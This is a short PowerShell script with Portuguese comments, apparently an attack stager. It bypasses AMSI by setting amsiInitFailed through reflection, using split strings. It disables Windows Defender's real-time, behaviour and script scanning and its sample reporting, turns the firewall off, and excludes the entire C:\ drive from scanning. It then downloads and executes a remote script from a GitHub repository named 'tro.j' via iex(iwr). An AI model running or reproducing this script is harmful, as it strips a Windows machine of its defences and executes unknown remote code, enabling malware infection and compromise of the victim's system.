# ---------- AMSI BYPASS (método do artigo) ----------
$a = 'System.Management.Automation.A'
$b = 'msiUtils'
$c = [Ref].Assembly.GetType($a+$b)
$d = $c.GetField('amsiInitFailed','NonPublic,Static')
$d.SetValue($null,$true)

# ---------- Desativações (opcional, pode comentar se não quiser) ----------
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off

# ---------- Exclusão do C:\ ----------
$drive = [char]67 + ':\'
Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue

# ---------- DISTRAÇÃO automática ----------
Write-Host "[*] Executando distração..."
iex (iwr -Uri 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/DISTRACTION.ps1' -UseBasicParsing).Content

Write-Host "[+] AMSI bypass ativo. Janela pronta para novos comandos."
